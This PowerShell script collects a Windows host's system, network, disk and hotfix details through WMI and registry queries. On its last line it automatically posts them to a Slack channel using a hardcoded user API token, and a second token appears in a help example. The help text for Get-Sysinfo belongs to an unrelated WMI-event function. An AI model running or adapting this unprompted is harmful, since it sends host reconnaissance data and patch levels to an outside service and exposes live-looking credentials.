function Get-Sysinfo
{

  <#
      .SYNOPSIS

      Gets system info. 

      .DESCRIPTION
      This function will collect a plethora of data elements that are important to a Microsoft Windows System Administrator.
      .PARAMETER Binding

      Indicates that WMI _FilterToConsumerBinding instances be returned. 

      .PARAMETER Consumer

      Indicates that WMI event consumers are returned. 

      .PARAMETER Filter

      Indicates that WMI event filters are returned. 

      .PARAMETER Name

      Specifies the WMI event instance name to return. 

      .PARAMETER ComputerName

      Specifies the remote computer system to add a permanent WMI event to. The default is the local computer.

      Type the NetBIOS name, an IP address, or a fully qualified domain name (FQDN) of one or more computers. To specify the local computer, type the computer name, a dot (.), or localhost.

      .PARAMETER Credential

      The credential object used to authenticate to the remote system. If not specified, the current user instance will be used.

      .EXAMPLE

      PS C:\>Get-WMIEvent -Name TestEvent

      This command will return all WMI event objects named 'TestEvent'.

      .EXAMPLE

      PS C:\>Get-WMIEvent -Consumer -Filter

      This command will return all WMI event consumers and filters.

      .EXAMPLE

      PS C:\>Get-WMIEvent -Name TestEvent | Remove-WMIEvent

      This command will return all WMI event objects with the name TestEvent.

      .OUTPUTS

      System.Management.ManagementBaseObject.ManagementObject

      This cmdlet returns System.Management.ManagementBaseObject.ManagementObject objects.

  #>
  Begin
  {
    $Computer = "$env:COMPUTERNAME"
    $i = 0
    #Adjusting ErrorActionPreference to stop on all errors
    $TempErrAct = $ErrorActionPreference
    $ErrorActionPreference = 'Stop'
		
    #Defining $CompInfo Select Properties For Correct Display Order
    $CompInfoSelProp = @(
            'Computer'
            'Domain'
            'OperatingSystem'
            'OSArchitecture'
            'BuildNumber'
            'ServicePack'
            'Manufacturer'
            'Model'
            'SerialNumber'
            'Processor'
            'LogicalProcessors'
            'PhysicalMemory'
            'OSReportedMemory'
            'PAEEnabled'
            'InstallDate'
            'LastBootUpTime'
            'UpTime'
            'RebootPending'
            'RebootPendingKey'
            'CBSRebootPending'
            'WinUpdRebootPending'
            'LogonServer'
            'PageFile'
        )#End $CompInfoSelProp
		
        #Defining $NetInfo Select Properties For Correct Display Order
        $NetInfoSelProp = @(
            'NICName'
            'NICManufacturer'
            'DHCPEnabled'
            'MACAddress'
            'IPAddress'
            'IPSubnetMask'
            'DefaultGateway'
            'DNSServerOrder'
            'DNSSuffixSearch'
            'PhysicalAdapter'
            'Speed'
        )#End $NetInfoSelProp
		
        #Defining $VolInfo Select Properties For Correct Display Order
        $VolInfoSelProp = @(
            'DeviceID'
            'VolumeName'
            'VolumeDirty'
            'Size'
            'FreeSpace'
            'PercentFree'
        )#End $VolInfoSelProp   
  }#End Begin
  
  Process
  {
    Try
    {
                $WMI_PROC = Get-WmiObject -Class Win32_Processor -ComputerName $Computer                      
                $WMI_BIOS = Get-WmiObject -Class Win32_BIOS -ComputerName $Computer
                $WMI_CS = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $Computer
                $WMI_OS = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer                      
                $WMI_PM = Get-WmiObject -Class Win32_PhysicalMemory -ComputerName $Computer
                $WMI_LD = Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType = '3'" -ComputerName $Computer                  
                $WMI_NA = Get-WmiObject -Class Win32_NetworkAdapter -ComputerName $Computer                    
                $WMI_NAC = Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=$true" -ComputerName $Computer
                $WMI_HOTFIX = Get-WmiObject -Class Win32_quickfixengineering -ComputerName $Computer
                $WMI_NETLOGIN = Get-WmiObject -Class win32_networkloginprofile -ComputerName $Computer
                $WMI_PAGEFILE = Get-WmiObject -Class Win32_PageFileUsage

                #Connecting to the Registry to determine PendingReboot status.
                $RegCon = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]'LocalMachine',$Computer)
                #If Windows Vista & Above, CBS Will Not Write To The PFRO Reg Key, Query CBS Key For "RebootPending" Key.
                #Also, since there are properties that are exclusive to 2K8+ marking "Unaval" for computers below 2K8.
                $WinBuild = $WMI_OS.BuildNumber
                $CBSRebootPend, $RebootPending = $false, $false
                If ([INT]$WinBuild -ge 6001)
                {
                    #Querying the Component Based Servicing reg key for pending reboot status.
                    $RegSubKeysCBS  = $RegCon.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\').GetSubKeyNames()
                    $CBSRebootPend  = $RegSubKeysCBS -contains 'RebootPending'

                    #Values that are present in 2K8+
                    $OSArchitecture = $WMI_OS.OSArchitecture
                    $LogicalProcs   = $WMI_CS.NumberOfLogicalProcessors
                }#End If ($WinBuild -ge 6001)
                Else
                {
                    #Win32_OperatingSystem does not have a value for OSArch in 2K3 & Below
                    $OSArchitecture = '**Unavailable**'

                    #In order to gather processor count for 2K3 & Below, Win32_Processor Instance Count is needed.
                    If ($WMI_PROC.Count -gt 1)
                    {
                        $LogicalProcs = $WMI_PROC.Count
                    }#End If ($WMI_PROC.Count -gt 1)
                    Else
                    {
                        $LogicalProcs = 1
                    }#End Else
                }#End Else
						
                #Querying Session Manager for both 2K3 & 2K8 for the PendingFileRenameOperations REG_MULTI_SZ to set PendingReboot value.
                $RegSubKeySM      = $RegCon.OpenSubKey('SYSTEM\CurrentControlSet\Control\Session Manager\')
                $RegValuePFRO     = $RegSubKeySM.GetValue('PendingFileRenameOperations',$false)

                #Querying WindowsUpdate\Auto Update for both 2K3 & 2K8 for "RebootRequired"
                $RegWindowsUpdate = $RegCon.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\').GetSubKeyNames()
                $WUAURebootReq    = $RegWindowsUpdate -contains 'RebootRequired'
                $RegCon.Close()
						
                #Setting the $RebootPending var based on data read from the PendingFileRenameOperations REG_MULTI_SZ and CBS Key.	
                If ($CBSRebootPend -or $RegValuePFRO -or $WUAURebootReq)
                {
                    $RebootPending = $true
                }#End If ($RegValuePFRO -eq "NoValue")
						
                #Calculating Memory, Converting InstallDate, LastBootTime, Uptime.
                [int]$Memory  = ($WMI_PM | Measure-Object -Property Capacity -Sum).Sum / 1MB
                $InstallDate  = ([WMI]'').ConvertToDateTime($WMI_OS.InstallDate)
                $LastBootTime = ([WMI]'').ConvertToDateTime($WMI_OS.LastBootUpTime)
                $UpTime       = New-TimeSpan -Start $LastBootTime -End (Get-Date)
						
                #PAEEnabled is only valid on x86 systems, setting value to false first.
                $PAEEnabled = $false
                If ($WMI_OS.PAEEnabled)
                {
                    $PAEEnabled = $true
                }
						
                #Creating the $CompInfo Object
                New-Object PSObject -Property @{
                    Computer            = $WMI_CS.Name
                    Domain              = $WMI_CS.Domain.ToUpper()
                    OperatingSystem     = $WMI_OS.Caption
                    OSArchitecture      = $OSArchitecture
                    BuildNumber         = $WinBuild
                    ServicePack         = $WMI_OS.ServicePackMajorVersion
                    Manufacturer        = $WMI_CS.Manufacturer
                    Model               = $WMI_CS.Model
                    SerialNumber        = $WMI_BIOS.SerialNumber
                    Processor           = ($WMI_PROC | Select-Object -ExpandProperty Name -First 1)
                    LogicalProcessors   = $LogicalProcs
                    PhysicalMemory      = $Memory
                    OSReportedMemory    = [int]$($WMI_CS.TotalPhysicalMemory / 1MB)
                    PAEEnabled          = $PAEEnabled
                    InstallDate         = $InstallDate
                    LastBootUpTime      = $LastBootTime
                    UpTime              = $UpTime
                    RebootPending       = $RebootPending
                    RebootPendingKey    = $RegValuePFRO
                    CBSRebootPending    = $CBSRebootPend
                    WinUpdRebootPending = $WUAURebootReq
                    LogonServer         = $ENV:LOGONSERVER
                    PageFile            = $WMI_PAGEFILE.Caption
                } | Select-Object $CompInfoSelProp
						
                #There may be multiple NICs that have IPAddresses, hence the Foreach loop.
                Write-Output 'Network Adaptors'`n
                Foreach ($NAC in $WMI_NAC)
                {
                    #Getting properties from $WMI_NA that correlate to the matched Index, this is faster than using $WMI_NAC.GetRelated('Win32_NetworkAdapter'). 
                    $NetAdap = $WMI_NA | Where-Object {
                        $NAC.Index -eq $_.Index
                    }
								
                    #Since there are properties that are exclusive to 2K8+ marking "Unaval" for computers below 2K8.
                    If ($WinBuild -ge 6001)
                    {
                        $PhysAdap = $NetAdap.PhysicalAdapter
                        $Speed    = '{0:0} Mbit' -f $($NetAdap.Speed / 1000000)
                    }#End If ($WinBuild -ge 6000)
                    Else
                    {
                        $PhysAdap = '**Unavailable**'
                        $Speed    = '**Unavailable**'
                    }#End Else

                    #Creating the $NetInfo Object
                    New-Object PSObject -Property @{
                        NICName         = $NetAdap.Name
                        NICManufacturer = $NetAdap.Manufacturer
                        DHCPEnabled     = $NAC.DHCPEnabled
                        MACAddress      = $NAC.MACAddress
                        IPAddress       = $NAC.IPAddress
                        IPSubnetMask    = $NAC.IPSubnet
                        DefaultGateway  = $NAC.DefaultIPGateway
                        DNSServerOrder  = $NAC.DNSServerSearchOrder
                        DNSSuffixSearch = $NAC.DNSDomainSuffixSearchOrder
                        PhysicalAdapter = $PhysAdap
                        Speed           = $Speed
                    } | Select-Object $NetInfoSelProp
                }#End Foreach ($NAC in $WMI_NAC)
							
                #There may be multiple Volumes, hence the Foreach loop.
                Write-Output 'Disk Information'`n
                Foreach ($Volume in $WMI_LD)
                {
                    #Creating the $VolInfo Object
                    New-Object PSObject -Property @{
                        DeviceID    = $Volume.DeviceID
                        VolumeName  = $Volume.VolumeName
                        VolumeDirty = $Volume.VolumeDirty
                        Size        = $('{0:F} GB' -f $($Volume.Size / 1GB))
                        FreeSpace   = $('{0:F} GB' -f $($Volume.FreeSpace / 1GB))
                        PercentFree = $('{0:P}' -f $($Volume.FreeSpace / $Volume.Size))
                    } | Select-Object $VolInfoSelProp
                }#End Foreach ($Volume in $WMI_LD)
                Write-Output 'Hotfix(s) Installed: '$WMI_HOTFIX.Count`n
                $WMI_HOTFIX|Select-Object -Property Description, HotfixID, InstalledOn
            }#End Try

            Catch
            {
                Write-Warning "$_"
            }#End Catch
    }#End Process
	
    End
    {
        #Resetting ErrorActionPref
        $ErrorActionPreference = $TempErrAct
    }#End End
}#End Function Get-Sysinfo

    function Send-Message {

        <# 
        .SYNOPSIS
        Sends a message to the specific Slack Channel through the API.

        .DESCRIPTION
        Sends a message to the specific Slack Channel through the API. Messages uses the Slack "text" field for a header and "attachment" field for the main body of the message.

        .PARAMETER Token
        API authentication token for the Slack team and user.

        .PARAMETER Channel
        Channel ID to monitor (must use ID number, not name).

        .PARAMETER Text 
        Main body of the message. This will be an "attachment" in the Slack API call. 

        .PARAMETER Header
        Header text for the message. This will be the "text" in the Slack API call.
        
        .EXAMPLE
        Send-Message -Token "xoxp-175828824580-175707545745-176600001223-826315a84e533c482bb7e20e8312sdf3" -Channel "ABC123456" -Header "Message Header" -Text "Hell World!"

        #>

        param(
        [Parameter(Mandatory=$true, Position=0)][string]$token,
        [Parameter(Mandatory=$true, Position=1)][string]$channelID,
        [string]$text = "",
        [string]$header = "" 
        )

        Write-Verbose "[+] Sending $text"
        
        $chars = $text.Length

        #if more than 3,000 chars then the data must be uploaded as a snippet due to api limits
        DO 
        {
            If ($chars -gt 3000) {
                $tmp = $text.Substring(0,3000)
                $text = $text.Substring(3000)
                $chars = $text.Length
                }
            else {
                $chars = 0
                $tmp = $text
            }

            $attachment = Format-Table -InputObject $tmp | ConvertTo-Json
            $body = @{"token" = $token; "channel" = $channelID; "attachments" = $attachment; "as_user" = $true; "text" = $header}
            Invoke-RestMethod -Uri "https://slack.com/api/chat.postMessage" -Body $body
        } until ($chars -eq 0)  
    }
    
$text = Get-Sysinfo | Out-String
Send-Message  -Token "xoxp-366454678064-367150097634-368103125126-9ab5e11e3488004c58f6c9088ded6600" -Channel "general" -Header "SysInfo" -Text $text
